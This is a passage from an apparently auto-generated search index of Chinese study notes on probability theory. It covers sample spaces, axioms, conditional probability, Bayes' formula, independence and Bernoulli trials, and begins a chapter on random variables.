<li>\u8bd5\u9a8c\u4e4b\u524d\u4e0d\u77e5\u9053\u4f1a\u51fa\u73b0\u4f55\u79cd\u7ed3\u679c\uff08\u5b9a\u6027\uff09</li> <li>\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u679c\u662f\u5df2\u77e5\u7684\uff08\u5b9a\u91cf\uff09</li> </ul>"},{"location":"math/prob_theory/chapter1/#_4","title":"\u6837\u672c\u7a7a\u95f4","text":"<p>\u6837\u672c\u7a7a\u95f4\uff1a\u968f\u673a\u73b0\u8c61\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u679c \\(\\Omega\\).</p> <p>\u6837\u672c\u70b9\uff1a\u6bcf\u4e00\u4e2a\u7ed3\u679c \\(\\omega \\in \\Omega\\).</p>"},{"location":"math/prob_theory/chapter1/#_5","title":"\u4e8b\u4ef6","text":"<p>\u4e8b\u4ef6\uff1a\u5177\u6709\u67d0\u79cd\u5c5e\u6027\u7684\u57fa\u672c\u7ed3\u679c\u6784\u6210\u4e8b\u4ef6\uff0c\u901a\u5e38\u7528 \\(A, B, C\\) \u8868\u793a.</p> <p>\u4e8b\u4ef6\u7684\u53d1\u751f\uff1a\u67d0\u6b21\u8bd5\u9a8c\u7684\u7ed3\u679c \\(\\omega \\in A\\) \u5219 \\(A\\) \u53d1\u751f\uff0c\u5426\u5219\u4e0d\u53d1\u751f.</p>"},{"location":"math/prob_theory/chapter1/#_6","title":"\u6982\u7387","text":"<p>\u6982\u7387\uff1a\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6982\u7387 \\(P(A)\\).</p> <p>\u6982\u7387\u7684\u8ba1\u7b97\uff1a</p> <ul> <li>\u7269\u7406\u65b9\u6cd5</li> <li>\u7edf\u8ba1\u65b9\u6cd5\uff1a\u9891\u7387\u4f30\u8ba1\u6982\u7387.</li> </ul> <p>\u6982\u7387\u7684\u5b9a\u4e49\u548c\u91cf\u5316\uff1a</p> <ul> <li>\u4e3b\u89c2\u6982\u7387\uff1a\u57fa\u4e8e\u5df2\u6709\u77e5\u8bc6\u548c\u4fe1\u606f\u7684\u4e00\u79cd\u4fe1\u4ef0\u6216\u5224\u65ad</li> <li>\u7ecf\u9a8c\u6982\u7387\uff08\u7edf\u8ba1\uff09\uff1a\u901a\u8fc7\u968f\u673a\u6d4b\u8bd5\uff08\u4f8b\uff1a\u629b\u63b7\u786c\u5e01\uff0c\u9891\u7387\u63a8\u7b97\u6982\u7387\uff09</li> <li>\u516c\u7406\u5316\u4f53\u7cfb\uff1a\u4e25\u683c\u903b\u8f91\u63a8\u7406</li> </ul> <p>\u5173\u4e8e\u7edf\u8ba1\u65b9\u6cd5</p> <ul> <li>\u7edf\u8ba1\u65b9\u6cd5\u5177\u4f53\u3001\u53ef\u8ba1\u7b97</li> <li>\u7edf\u8ba1\u65b9\u6cd5\u7684\u57fa\u672c\u51fa\u53d1\u70b9\uff1a\u9891\u7387\u6781\u9650\u5b58\u5728\u4e14\u4e0d\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u8bd5\u9a8c\u73af\u5883</li> <li>\u9891\u7387\u7684\u6781\u9650\u662f\u6982\u7387\uff1aBernoulli \u548c Borel \u6570\u5b66\u8bc1\u660e</li> </ul> <p>\u6982\u7387\u8bba\u4e3b\u8981\u76ee\u7684\uff1a\u8ba1\u7b97\u968f\u673a\u4e8b\u4ef6\u7684\u6982\u7387.</p> <p>\u4e8b\u4ef6\u7684\u8fd0\u7b97</p> <p>\u548c\u96c6\u5408\u8fd0\u7b97\u7c7b\u4f3c\uff0c\u6ce8\u610f\u672f\u8bed\u4f7f\u7528\u3002</p> <ul> <li>\\(\\emptyset\\) \uff0c\u4e0d\u53ef\u80fd\u4e8b\u4ef6.</li> <li>\\(\\Omega\\) \uff0c\u5fc5\u7136\u4e8b\u4ef6.</li> <li>\\(A \\subseteq B\\) \uff0c\\(A\\) \u53d1\u751f\u5219 \\(B\\) \u4e00\u5b9a\u53d1\u751f.</li> <li>\\(A \\cap B \\ \\text{or} \\ AB\\) \uff0c\\(A\\) \u548c \\(B\\) \u540c\u65f6\u53d1\u751f.</li> <li>\\(A \\cup B\\) \uff0c\\(A\\) \u6216\u8005 \\(B\\) \u53d1\u751f.</li> <li>\\(\\bar A\\) \uff0c\\(A\\) \u7684\u5bf9\u7acb\u4e8b\u4ef6.</li> <li>\\(A \\setminus B\\) \uff0c\\(A\\) \u53d1\u751f\u4f46 \\(B\\) \u4e0d\u53d1\u751f.</li> <li>\\(A \\cap B = \\emptyset\\) \uff0c\\(A, B\\) \u4e92\u4e0d\u76f8\u4ea4\uff0c\u5199\u4f5c \\(A \\cup B = A + B\\).</li> <li>\\(\\text{De Morgan}\\) \u5bf9\u5076\u8fd0\u7b97\u539f\u7406\uff1a\\(\\overline{(\\cap A_n)} = \\cup \\bar A_n, \\overline{(\\cup A_n)} = \\cap\\bar A_n\\).</li> </ul>"},{"location":"math/prob_theory/chapter1/#_7","title":"\u6982\u7387\u8fd0\u7b97\u7684\u57fa\u672c\u6027\u8d28","text":"<ul> <li>\\(P(\\emptyset) = 0, P(\\Omega) = 1\\)</li> <li>\\(P(\\bar A) = 1 - P(A)\\)</li> <li>\\(A \\cap B = \\emptyset\\)\uff0c\u5219</li> </ul> \\[ P(A + B) = P(A) + P(B) \\] <ul> <li>\u82e5 \\(A_1, \\cdots, A_m\\) \u4e92\u4e0d\u76f8\u4ea4\uff0c\u5219</li> </ul> \\[ P(\\sum_{k=1}^{m}A_k) = \\sum_{k=1}^{m}P(A_k) \\]"},{"location":"math/prob_theory/chapter1/#_8","title":"\u57fa\u672c\u6982\u7387\u6a21\u578b","text":"<p>\u6982\u7387\u6a21\u578b\uff1a\u968f\u673a\u73b0\u8c61\u7684\u6570\u5b66\u63cf\u8ff0\uff0c\u5305\u62ec\u6837\u672c\u7a7a\u95f4\u3001\u4e8b\u4ef6\u3001\u6bcf\u4e2a\u4e8b\u4ef6\u7684\u6982\u7387\u5927\u5c0f\u3002</p>"},{"location":"math/prob_theory/chapter1/#_9","title":"\u53e4\u5178\u6982\u7387\u6a21\u578b","text":"<p>\u6a21\u578b\u7279\u5f81\uff1a</p> <ul> <li>\u6709\u9650\u4e2a\u57fa\u672c\u7ed3\u679c</li> <li>\u6bcf\u4e2a\u7ed3\u679c\u7b49\u53ef\u80fd\u53d1\u751f</li> </ul> <p>\u6570\u5b66\u63cf\u8ff0\uff1a</p> \\[ \\begin{align}     \\Omega = \\{\\omega_1, \\dots, \\omega_N\\}, \\quad N &lt; \\infty \\\\     P(\\{\\omega_i\\}) = \\frac{1}{N}, \\quad i = 1, 2, \\dots, N \\end{align} \\] <p>\u4e8b\u4ef6 A \u7684\u6982\u7387\uff1a \\(P(A) = \\displaystyle\\frac{|A|}{N}\\) \uff0c\u5176\u4e2d \\(|A|\\) \u4e3a\u4e8b\u4ef6\u5305\u542b\u57fa\u672c\u7ed3\u679c\u6570\u3002</p> <p>\u5bf9\u4e8e\u53e4\u5178\u6982\u7387\u6a21\u578b\uff0c\u5173\u952e\u5728\u4e8e\u8ba1\u7b97 \\(N\\) \u548c \\(|A|\\) \u3002</p> <p>\u8ba1\u7b97\u6280\u5de7</p> <ul> <li>\u4e58\u6cd5\u539f\u7406</li> <li>\u6392\u5217\u7ec4\u5408</li> </ul> <p>\u5e38\u7528\u5173\u7cfb\u5f0f\uff1a</p> \\[ \\begin{array}{ccc}     \\displaystyle P_{N}^{k} = N(N-1)\\dots (N-k+1) = \\frac{N!}{k!} \\\\     \\displaystyle {N \\choose k} = \\frac{P_N^k}{k!} \\\\     \\displaystyle {N \\choose k} + {N \\choose k-1} = {N+1 \\choose k} \\\\     \\displaystyle N! \\sim \\sqrt{2\\pi N} e^{-N} N^N, \\quad N \\rightarrow \\infty \\end{array} \\]"},{"location":"math/prob_theory/chapter1/#_10","title":"\u51e0\u4f55\u6982\u7387\u6a21\u578b","text":"<p>\u6a21\u578b\u7279\u5f81\uff1a\u6837\u672c\u7a7a\u95f4\u662f\u4e00\u4e2a\u533a\u57df\uff0c\u6240\u6709\u57fa\u672c\u7ed3\u679c\u7b49\u53ef\u80fd\u53d1\u751f\u3002</p> <ul> <li>\u57fa\u672c\u7ed3\u679c\u4e0d\u53ef\u6570\uff0c\u4e14 \\(\\Omega\\) \u662f \\(\\mathbb{R}, \\mathbb{R}^2, \\dots, \\mathbb{R}^k\\) \u4e0a\u7684\u53ef\u6d4b\u533a\u57df</li> <li>\u4e8b\u4ef6 \\(A\\) \u662f \\(\\Omega\\) \u7684\u53ef\u6d4b\u5b50\u96c6</li> <li>\u4e8b\u4ef6 \\(A\\) \u7684\u6982\u7387 \\(\\displaystyle P(A) = \\frac{|A|}{|\\Omega|}\\)</li> </ul> <p>\u5173\u952e\u5728\u4e8e\u8ba1\u7b97 \\(|A|, |\\Omega|\\)</p> Buffon's Needle Problem <p>\u82e5\u4e00\u6839\u957f\u5ea6\u4e3a \\(l\\) \u7684\u77ed\u9488\uff0c\u629b\u5728\u6a2a\u7ebf\u95f4\u95f4\u8ddd\u4e3a \\(d\\) \u7684\u5747\u5300\u6a2a\u7eb9\u7eb8\u4e0a\uff0c\u6c42\u9488\u843d\u5728\u4e00\u4e2a\u4e0e\u67d0\u6761\u6a2a\u7ebf\u76f8\u4ea4\u7684\u4f4d\u7f6e\u7684\u6982\u7387\u3002\u5047\u8bbe \\(l \\leq d\\) \u3002</p> <p>\u8bb0\u9488\u7684\u4e2d\u5fc3\u8ddd\u79bb\u6700\u8fd1\u7684\u5e73\u884c\u7ebf\u7684\u8ddd\u79bb\u4e3a \\(a &lt; d/2\\) \uff0c\u9488\u4e0e\u5e73\u884c\u7ebf\u7684\u5939\u89d2\u4e3a \\(\\theta \\leq \\pi /2\\) \u3002</p> <p>\u5219\u6837\u672c\u7a7a\u95f4 \\(\\Omega = [0, d / 2] \\times [0, \\pi / 2]\\)</p> <p>\u8bb0\u4e8b\u4ef6 \\(A\\) \u4e3a\u9488\u843d\u5728\u4e00\u4e2a\u4e0e\u67d0\u6761\u6a2a\u7ebf\u76f8\u4ea4\u7684\u4f4d\u7f6e\uff0c\u5219</p> \\[ A \\ \\text{\u53d1\u751f} \\iff a \\leq \\frac{l}{2}\\sin\\theta \\] \\[ \\begin{align}     P(A) &amp;= \\frac{|A|}{|\\Omega|} \\\\          &amp;= \\frac{\\int_{0}^{\\pi / 2}\\frac{l}{2} \\sin\\theta \\text{d}\\theta}{\\frac{d}{2}\\frac{\\pi}{2}} \\\\          &amp;= \\frac{2l}{\\pi d} \\end{align} \\]"},{"location":"math/prob_theory/chapter1/#_11","title":"\u5176\u4ed6\u6982\u7387\u6a21\u578b","text":"<p>\u4f8b\uff1a</p> <ul> <li>\u629b\u63b7\u4e0d\u5747\u5300\u786c\u5e01</li> <li>\u5f69\u7968</li> </ul>"},{"location":"math/prob_theory/chapter1/#_12","title":"\u6982\u7387\u7a7a\u95f4\u516c\u7406\u5316\u4f53\u7cfb","text":"<p>\u63cf\u8ff0\u6982\u7387\u7a7a\u95f4\u7684\u4e09\u8981\u7d20\uff1a</p> <ul> <li>\u6837\u672c\u7a7a\u95f4 \\(\\Omega\\)</li> <li>\u4e8b\u4ef6\u7c7b \\(\\sigma\\) -\u57df \\(\\mathcal{A}\\)</li> <li>\u6982\u7387 \\(P\\)</li> </ul> <p>\\((\\Omega, \\mathcal{A}, P)\\) \u6784\u6210\u6982\u7387\u7a7a\u95f4\uff0c\u662f\u968f\u673a\u73b0\u8c61\u7684\u6570\u5b66\u63cf\u8ff0\uff08\u6982\u7387\u6a21\u578b\uff09\uff0c\u5176\u4e2d\uff1a</p> <ul> <li>\\(\\mathcal{A}\\) \u6ee1\u8db3<ul> <li>\\(\\emptyset, \\Omega \\in \\mathcal{A}\\)</li> <li>\\(A \\in \\mathcal{A} \\rightarrow \\bar A \\in \\mathcal{A}\\)</li> <li>\\(A_n \\in \\mathcal{A}, n \\geq 1 \\rightarrow \\bigcup_{n=1}^{\\infty}A_n \\in \\mathcal{A}\\)</li> </ul> </li> <li>\\(P\\) \u6ee1\u8db3<ul> <li>\\(P(\\emptyset) = 0, P(\\Omega) = 1\\)</li> <li>\\(\\forall A \\in \\mathcal{A}, P(A) \\geq 0\\)</li> <li> <p>\\(A_n \\in \\mathcal{A}\\) \u4e92\u4e0d\u76f8\u4ea4\uff0c\u5219</p> \\[ P(\\sum_{n=1}^{\\infty}A_n) = \\sum_{n=1}^{\\infty}P(A_n) \\] </li> </ul> </li> </ul> \u4efb\u4f55\u6ee1\u8db3\u4e0a\u8ff0\u6027\u8d28\u7684 \\(P\\) \u90fd\u79f0\u4e3a\u7a7a\u95f4 \\((\\Omega, \\mathcal{A})\\) \u4e0a\u7684\u6982\u7387\u3002 <p>\u6982\u7387 \\(P\\) \u7684\u8fd0\u7b97\u6027\u8d28</p> <ul> <li>\u5355\u8c03\u6027\uff1a \\(A \\subseteq B\\) \uff0c\u5219 \\(P(A) \\leq P(B)\\)</li> <li>\\(P(\\bar A) = 1 - P(A)\\)</li> <li> <p>\u5bf9\u4efb\u610f \\(A_N \\in \\mathcal{A}, n \\geq 1\\),</p> \\[ P(\\bigcup_{n=1}^{\\infty}A_n) \\leq \\sum_{n=1}^{\\infty}P(A_n) \\] </li> <li> <p>\\(A, B \\in \\mathcal{A}\\) \uff0c\u5219\uff08\u5bb9\u65a5\u539f\u7406\uff09</p> \\[ P(A\\cup B) = P(A) + P(B) - P(AB) \\] </li> </ul>"},{"location":"math/prob_theory/chapter1/#_13","title":"\u6761\u4ef6\u6982\u7387","text":"<p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c \\(A, B\\) \u662f\u4e24\u4e2a\u4e8b\u4ef6\uff0c \\(P(B)&gt;0\\) \u3002\u4ee4</p> \\[ P(A|B) = \\frac{P(AB)}{P(B)} \\] <p>\u4e3a\u5728 \\(B\\) \u53d1\u751f\u7684\u6761\u4ef6\u4e0b\uff0c \\(A\\) \u53d1\u751f\u7684\u6761\u4ef6\u6982\u7387\u3002</p> <p>\\(P(B)&gt;0\\)</p> <ul> <li>\u5206\u6bcd\u4e0d\u80fd\u4e3a \\(0\\)</li> <li>\u96f6\u6982\u7387\u4e8b\u4ef6\u65e0\u6cd5\u89c2\u5bdf\u5230</li> </ul> <p>\u539f\u516c\u5f0f\u53ef\u4ee5\u6539\u5199\u6210\u4e58\u6cd5\u516c\u5f0f</p> \\[ P(AB) = P(A|B)P(B) \\] <p>\u63a8\u5e7f\u5230\u591a\u4e2a\u4e8b\u4ef6\uff1a\u94fe\u5f0f\u6cd5\u5219</p> \\[ \\begin{align}     P(ABC) &amp;= P(A|BC)P(BC) \\\\            &amp;= P(A|BC)P(B|C)P(C) \\end{align} \\] Example <p>\\(n\\) \u5f20\u5f69\u7968\u6709\u4e00\u5f20\u4e2d\u5956\u5f69\u7968\uff0c\u6c42\u7b2c \\(k\\) \u4e2a\u4eba\u4e2d\u5956\u7684\u6982\u7387\u3002</p> <p>\u4ee4 \\(A_i\\) \u8868\u793a\u7b2c \\(i\\) \u4e2a\u4eba\u4e2d\u5956</p> \\[ \\begin{align} P(A_k \\bar A_1 \\dots \\bar A_{k-1}) &amp;= P(\\bar A_1)P(\\bar A_2|\\bar A_1)\\dots P(A_k|\\bar A_1 \\dots \\bar A_{k-1}) \\\\ &amp;= \\frac{n-1}{n} \\cdot \\frac{n-2}{n-1} \\cdot \\dots \\cdot \\frac{1}{n - k + 1} \\\\ &amp;= \\frac{1}{n} \\end{align} \\]"},{"location":"math/prob_theory/chapter1/#_14","title":"\u5168\u6982\u7387\u516c\u5f0f","text":"<p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c \\(B_k, 1\\leq k \\leq N\\) \u662f \\(N\\) \u4e2a\u4e92\u4e0d\u76f8\u4ea4\u4e8b\u4ef6\uff0c\u4e14 \\(\\Omega = \\sum_{k=1}^NB_k\\) \u5219</p> \\[ P(A) = \\sum_{k=1}^N P(A|B_k)P(B_k), \\quad N \\leq \\infty \\]"},{"location":"math/prob_theory/chapter1/#_15","title":"\u8d1d\u53f6\u65af\u516c\u5f0f","text":"<p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c \\(B_k, 1\\leq k \\leq N\\) \u662f \\(N\\) \u4e2a\u4e92\u4e0d\u76f8\u4ea4\u4e8b\u4ef6\uff0c\u4e14 \\(\\Omega = \\sum_{k=1}^NB_k\\) \u5219</p> \\[ P(B_k|A) = \\frac{P(A|B_k)P(B_k)}{\\sum_{i=1}^{N}P(A|B_i)P(B_i)} = \\frac{P(A|B_k)P(B_k)}{P(A)} \\] <p>\\(P(B_k)\\) \u4e3a\u5148\u9a8c\u6982\u7387\uff0c \\(P(B_k|A)\\) \u4e3a\u540e\u9a8c\u6982\u7387</p>"},{"location":"math/prob_theory/chapter1/#_16","title":"\u72ec\u7acb\u6027","text":""},{"location":"math/prob_theory/chapter1/#_17","title":"\u4e24\u4e2a\u4e8b\u4ef6\u72ec\u7acb","text":"<p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c\\(A, B\\) \u662f\u4e24\u4e2a\u4e8b\u4ef6\u3002\u5982\u679c \\(P(B)&gt;0\\)\uff0c\u5e76\u4e14</p> \\[ P(A|B)=P(A) \\] <p>\u5219 \\(A\\) \u548c \\(B\\) \u72ec\u7acb\u3002\u5219\u7531\u6761\u4ef6\u6982\u7387\u5b9a\u4e49\uff0c\u4e0a\u5f0f\u53ef\u5199\u6210</p> \\[ P(AB) = P(A)P(B) \\] <p>Note</p> <ul> <li>\\(P(B)=0\\) \u65f6\u4e58\u79ef\u516c\u5f0f\u4ecd\u6709\u610f\u4e49\u3002</li> <li>\\(A, B\\) \u5173\u7cfb\u5bf9\u7b49\u3002</li> <li>\u82e5 \\(A, B\\) \u72ec\u7acb\uff0c\u5219 \\(A, \\bar B\\) \u72ec\u7acb\uff0c \\(\\bar A, B\\) \u72ec\u7acb\uff0c \\(\\bar A, \\bar B\\) \u72ec\u7acb</li> <li> <p>\u4e0e\u52a0\u6cd5\uff08\u5e76\uff09\u7684\u533a\u522b\uff1a</p> \\[ \\begin{align}     P(A+B) &amp;= P(A) + P(B) \\qquad &amp;&amp;A \\cap B = \\emptyset \\\\     P(AB) &amp;= P(A)P(B) \\qquad &amp;&amp;A, B \\text{\u72ec\u7acb} \\end{align} \\] </li> </ul>"},{"location":"math/prob_theory/chapter1/#_18","title":"\u4e09\u4e2a\u4e8b\u4ef6\u72ec\u7acb","text":"<p>\u82e5 \\(A, B, C\\) \u662f\u4e09\u4e2a\u4e8b\u4ef6\uff0c\u82e5 \\(A, B, C\\) \u4e24\u4e24\u76f8\u4e92\u72ec\u7acb \u4e14</p> \\[ P(ABC) = P(A)P(B)P(C) \\] <p>\u5219\u79f0 \\(A,B,C\\) \u76f8\u4e92\u72ec\u7acb\u3002</p> <p>Warning</p> <p>\u4e24\u4e24\u72ec\u7acb\u4e0d\u4e00\u5b9a\u76f8\u4e92\u72ec\u7acb\uff0c\u76f8\u4e92\u72ec\u7acb\u4e00\u5b9a\u4e24\u4e24\u72ec\u7acb\u3002</p> <p>Example</p> <p>\u4e00\u4e2a\u6b63\u56db\u9762\u4f53\u7684\u4e09\u9762\u5206\u522b\u6d82\u6210\u7ea2\u3001\u9ed1\u3001\u767d\u4e09\u8272\uff0c\u53e6\u4e00\u9762\u6d82\u4e0a\u4e09\u79cd\u989c\u8272\u3002\u73b0\u968f\u673a\u4e00\u6254\uff0c\u8bb0\u5e95\u9762\u6d82\u6709\u7ea2\u3001\u9ed1\u3001\u767d\u5206\u522b\u4e3a\u4e8b\u4ef6 \\(A,B,C\\)\u3002</p> <p>\u53ef\u5f97</p> \\[ P(A) = P(B) = P(C) = \\frac{1}{2} \\] <p>\u4e14</p> \\[ \\begin{align} P(AB) = \\frac{1}{4} = P(A)P(B) \\\\ P(AC) = \\frac{1}{4} = P(A)P(C) \\\\ P(BC) = \\frac{1}{4} = P(B)P(C) \\end{align} \\] <p>\u5219 \\(A,B,C\\) \u4e24\u4e24\u72ec\u7acb\u3002\u4f46</p> \\[ P(ABC) = \\frac{1}{4} \\not = P(A)P(B)P(C) \\] <p>\u6545 \\(A,B,C\\) \u4e0d\u76f8\u4e92\u72ec\u7acb\u3002\u539f\u56e0\u5728\u4e8e\u82e5 \\(AB\\) \u53d1\u751f\uff0c\u5219 \\(C\\) \u4e00\u5b9a\u53d1\u751f\uff0c\u5931\u53bb\u4e86\u72ec\u7acb\u6027\u3002</p> <p>Note</p> <p>\u82e5 \\(A,B,C\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5219 \\(\\bar A,B,C\\) \u76f8\u4e92\u72ec\u7acb\uff0c\\(A+B, C\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u7b49\u7b49\u7c7b\u4f3c\u5173\u7cfb\u6210\u7acb\u3002</p>"},{"location":"math/prob_theory/chapter1/#m","title":"m \u4e2a\u4e8b\u4ef6\u76f8\u4e92\u72ec\u7acb","text":"<p>\u5047\u8bbe \\(A_k, 1\\leq k\\leq m\\) \u662f \\(m\\) \u4e2a\u4e8b\u4ef6\uff0c\u82e5 \\(A_k\\) \u4e2d\u4efb\u610f \\(r &lt; m\\) \u4e2a\u90fd\u76f8\u4e92\u72ec\u7acb\uff0c\u4e14</p> \\[ P(\\bigcap_{1\\leq k\\leq m}A_k) = \\prod_{1\\leq k\\leq m}P(A_k) \\] <p>\u5219 \\(A_k, 1\\leq k\\leq m\\) \u76f8\u4e92\u72ec\u7acb\u3002</p>"},{"location":"math/prob_theory/chapter1/#_19","title":"\u4e8c\u9879\u8bd5\u9a8c","text":"<p>\u53c8\u79f0 n-\u91cd Bernonlli \u8bd5\u9a8c\u3002</p> <ul> <li>\u8bd5\u9a8c \\(E\\) \u5305\u542b\u82e5\u5e72\u4e2a\u57fa\u672c\u7ed3\u679c\u3002</li> <li>\u4e8b\u4ef6 \\(A\\) \u4e3a\u5177\u6709\u67d0\u79cd\u5c5e\u6027\u7684\u57fa\u672c\u7ed3\u679c\u96c6\u5408\uff0c\u53d1\u751f\u7684\u6982\u7387\u4e3a \\(P(A) = p_A\\)</li> </ul> <p>\u72ec\u7acb\u91cd\u590d\u8fdb\u884c \\(n\\) \u6b21\u8bd5\u9a8c\uff0c\u5e76\u89c2\u5bdf\u8bb0\u5f55\u7ed3\u679c\u3002\u5224\u65ad \\(A\\) \u53d1\u751f\u4e0e\u5426\uff0c\u7edf\u8ba1 \\(A\\) \u53d1\u751f\u7684\u6b21\u6570 \\(n_A\\).</p> <p>\u6982\u7387\u6a21\u578b</p> <p>\u6bcf\u6b21\u8bd5\u9a8c \\(A\\) \u53d1\u751f\u8bb0\u4e3a \\(1\\)\uff0c\u4e0d\u53d1\u751f\u8bb0\u4e3a \\(0\\)\u3002</p> <p>\u72ec\u7acb\u91cd\u590d \\(n\\) \u6b21\u8bd5\u9a8c\uff0c\u6240\u5f97\u7ed3\u679c\u4e3a</p> \\[ \\omega = (\\omega _1, \\dots, \\omega _n) \\qquad \\omega_i =0, 1 \\] <p>\u7528 \\(\\Omega_n\\) \u8868\u793a\u6240\u6709 \\(\\omega\\) \u7684\u5168\u4f53</p> \\[ \\Omega_n = \\{\\omega = (\\omega _1, \\dots, \\omega _n), \\omega_i =0, 1\\} \\] <p>\u5176\u4e2d\u6bcf\u4e2a \\(\\omega\\) \u51fa\u73b0\u7684\u6982\u7387\u4e3a</p> \\[ P_n(\\{\\omega\\}) = p_A^{\\sum \\omega_i}(1 - p_A)^{n - \\sum \\omega_i} \\] <p>\u7531\u6b64\u5f97\u5230\u6982\u7387\u7a7a\u95f4 \\((\\Omega_n, P_n)\\)\uff0c\u5373\u4e3a n-\u91cd Bernonlli \u8bd5\u9a8c\u7684\u6982\u7387\u6a21\u578b\u3002</p> <p>\u8003\u8651\u4e8b\u4ef6 \\(B = \\{\\omega: n_A(\\omega) = k\\}\\)\uff0c\u5219</p> \\[ P_n(B) = {n \\choose k}p_A^k(1 - p_A)^{n - k} \\]"},{"location":"math/prob_theory/chapter1/#_20","title":"\u4e58\u79ef\u6982\u7387\u7a7a\u95f4","text":"<p>\u8003\u8651\u4e24\u4e2a\u8bd5\u9a8c \\(E_1, E_2\\)\uff0c\u5176\u6982\u7387\u7a7a\u95f4\u5206\u522b\u4e3a \\((\\Omega_1, P_1), (\\Omega_2, P_2)\\)</p> <p>\u73b0\u540c\u65f6\u72ec\u7acb\u505a\u4e24\u4e2a\u8bd5\u9a8c\uff0c\u8bb0\u5f55\u5176\u57fa\u672c\u7ed3\u679c \\(\\omega = (\\omega_1, \\omega_2)\\)</p> <p>\u8003\u8651 \\(E_1, E_2\\) \u6240\u6709\u57fa\u672c\u7ed3\u679c\u7684\u5168\u4f53</p> \\[ \\Omega = \\{\\omega = (\\omega_1, \\omega_2), \\quad \\omega_1 \\in \\Omega_1, \\omega_2 \\in \\Omega_2\\} \\] <p>\u8003\u8651\u4e8b\u4ef6</p> \\[ A = A_1 \\times A_2 = \\{\\omega = (\\omega_1, \\omega_2), \\quad \\omega_1 \\in A_1, \\omega_2 \\in A_2\\} \\] <p>\u5b9a\u4e49\u5176\u6982\u7387</p> \\[ P(A) = P(A_1)P(A_2) \\] <p>\u5f97\u5230\u65b0\u7684\u6982\u7387\u7a7a\u95f4\uff1a\u4e58\u79ef\u6982\u7387\u7a7a\u95f4 \\((\\Omega, P)\\)</p>"},{"location":"math/prob_theory/chapter1/#_21","title":"\u8865\u5145\u8bf4\u660e","text":""},{"location":"math/prob_theory/chapter1/#_22","title":"\u6982\u7387\u7684\u53ef\u52a0\u6027","text":"<p>\u5982\u679c \\(A_n, n \\geq 1\\) \u4e92\u4e0d\u76f8\u4ea4\uff0c\u5219</p> \\[ P(\\sum_{n = 1}^\\infty A_n) = \\sum_{n = 1}^\\infty P(A_n) \\]"},{"location":"math/prob_theory/chapter1/#_23","title":"\u6982\u7387\u7684\u8fde\u7eed\u6027","text":"<p>\u4e8b\u4ef6\u7684\u6781\u9650</p> <ul> <li> <p>\u5047\u8bbe \\(A_n\\) \u662f\u4e00\u5217\u589e\u52a0\u4e8b\u4ef6</p> \\[ A_1 \\subseteq \\dots \\subseteq A_n \\subseteq \\dots \\] <p>\u5b9a\u4e49</p> \\[ \\lim_{n \\to \\infty} A_n = \\bigcup_{n=1}^\\infty A_n \\] </li> <li> <p>\u5047\u8bbe \\(A_n\\) \u662f\u4e00\u5217\u9012\u51cf\u4e8b\u4ef6</p> \\[ A_1 \\supseteq \\dots \\supseteq A_n \\supseteq \\dots \\] <p>\u5b9a\u4e49</p> \\[ \\lim_{n \\to \\infty} A_n = \\bigcap_{n=1}^\\infty A_n \\] </li> </ul> <p>\u5047\u8bbe \\(A_n\\) \u662f\u4e00\u5217\u589e\u52a0\u4e8b\u4ef6\uff0c\u5219</p> \\[ P(\\lim_{n\\to \\infty} A_n) = \\lim_{n\\to \\infty}P(A_n) \\] <p>Proof</p> <p>\u8bb0 \\(B_1 = A_1, B_k = A_k - A_{k - 1}\\) \uff0c\u5219 \\(B_k\\) \u4e92\u4e0d\u76f8\u4ea4\uff0c\u5219</p> \\[ \\begin{align} P(\\lim_{n\\to\\infty}A_n) &amp;= P(\\sum_{n=1}^\\infty B_n) \\\\                         &amp;= \\sum_{n=1}^\\infty P(B_n) \\\\                         &amp;= \\sum_{n=1}^\\infty P(A_n) - P(A_{n - 1}) \\\\                         &amp;= \\lim_{n\\to\\infty} P(A_n) \\end{align} \\]"},{"location":"math/prob_theory/chapter1/#_24","title":"\u6761\u4ef6\u6982\u7387\u5177\u6709\u6982\u7387\u7684\u8fd0\u7b97\u6027\u8d28","text":"<p>\u5047\u8bbe \\((\\Omega, \\mathcal{A}, P)\\) \u662f\u6982\u7387\u7a7a\u95f4\uff0c \\(B\\) \u662f\u4e00\u4e2a\u4e8b\u4ef6\uff0c \\(P(B)&gt;0\\)</p> <p>\u5bf9\u4e8e\u4efb\u610f\u4e8b\u4ef6 \\(A \\in \\mathcal{A}\\) \uff0c\u6761\u4ef6\u6982\u7387 \\(P(A|B) = \\frac{P(AB)}{P(B)}\\)</p> <p>\u5c06</p> \\[ P(\\cdot | B) : \\mathcal{A} \\mapsto [0, 1] \\] <p>\u89c6\u4f5c\u4e00\u4e2a\u6982\u7387\u3002</p> <p>\u5219\u6709</p> \\[ \\begin{align} P(A_1+A_2|B) = P(A_1|B) + P(A_2|B) \\\\ P(A_1-A_2|B) = P(A_1|B) - P(A_2|B) \\end{align} \\] <p>\u7b49\u7b49\u7c7b\u4f3c\u6027\u8d28\u3002</p>"},{"location":"math/prob_theory/chapter2/","title":"\u968f\u673a\u53d8\u91cf\u4e0e\u5206\u5e03\u51fd\u6570","text":""},{"location":"math/prob_theory/chapter2/#_2","title":"\u968f\u673a\u53d8\u91cf\u4e0e\u5206\u5e03\u51fd\u6570","text":"<p>\u968f\u673a\u53d8\u91cf\u662f\u5b9a\u4e49\u5728\u6982\u7387\u7a7a\u95f4\u4e0a\u53d6\u5b9e\u6570\u503c\u7684\u53ef\u6d4b\u51fd\u6570</p> <p>\u968f\u673a\u53d8\u91cf</p> <ul> <li>\u63b7\u9ab0\u5b50\u51fa\u73b0\u7684\u70b9\u6570</li> <li>\u6d4b\u91cf\u706f\u6ce1\u7684\u5bff\u547d</li> <li>\u6d4b\u91cf\u7269\u4f53\u7684\u957f\u5ea6</li> 